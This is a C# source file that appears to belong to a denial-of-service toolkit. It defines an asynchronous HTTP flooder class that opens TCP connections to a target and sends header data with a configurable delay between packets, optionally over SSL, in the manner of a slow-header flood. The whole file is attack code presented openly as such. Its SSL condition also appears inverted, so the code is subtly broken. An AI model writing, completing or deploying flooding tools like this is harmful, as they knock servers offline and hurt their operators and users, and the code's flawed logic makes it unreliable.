using System;
using System.IO;
using System.Net.Sockets;
using System.Threading.Tasks;
using GAS.Core.AttackInformation;

namespace GAS.Core.Attacks {
    public class AsyncHttpFlooder : AsyncHttpFlooderCore {
        private int _headersDelay;

        public IHttpAttackInfo HttpAttackInfo {
            get {
                return this.AttackInfo as IHttpAttackInfo;
            }
            set {
                this.AttackInfo = value;
            }
        }

        public AsyncHttpFlooder():base() {
            this.SendHeaders = this.SendHeadersI;
            this.WrapStream = this.WrapStreamI;
        }
        /// <summary>
        /// HeaderGenerator
        /// </summary>
        public Func<byte[], object, int> HeaderGenerator { get; set; }
        /// <summary>
        /// Delay between sent headers packets
        /// </summary>
        public int HeadersDelay {
            get { return this._headersDelay; }
            set {
                if ( this.Active )
                    throw new InvalidOperationException( "HeadersDelay setting is not allowed while attacking" );
                this._headersDelay = value;
            }
        }
        #region AsyncHttpFlooder
        /// <summary>
        /// Sends headers.
        /// Override to do magic with headers.
        /// Don't forget to append double \r\n to end
        /// </summary>
        /// <param name="stream">IO stream</param>
        /// <param name="basestream">Unwrapped IO stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>Was operation succeed</returns>
        protected virtual async Task<bool> SendHeadersI(
            Stream stream,
            NetworkStream basestream,
            object token ) {
            return await AsyncFlooderImplementations.SendData(
                stream: stream,
                generator: this.HeaderGenerator,
                cancellationToken: () => this.Active,
                generatorToken: token,
                delay: this.HeadersDelay,
                bufferSize: 256
            );
        }
        /// <summary>
        /// Prepares stream for transfer.
        /// Gets stream from raw stream after connection
        /// Override to use ssl/similar.
        /// </summary>
        /// <param name="getStream">input stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>stream which will be used to transfer data</returns>
        protected virtual async Task<Stream> WrapStreamI( NetworkStream getStream, object token ) {
            return this.HttpAttackInfo.Ssl.UseSsl
                ? getStream as Stream
                : await AsyncFlooderImplementations.GetSslStream(
                    getStream,
                    this.HttpAttackInfo.Ssl.Domain
                ) as Stream;
        }
        #endregion
    }
}
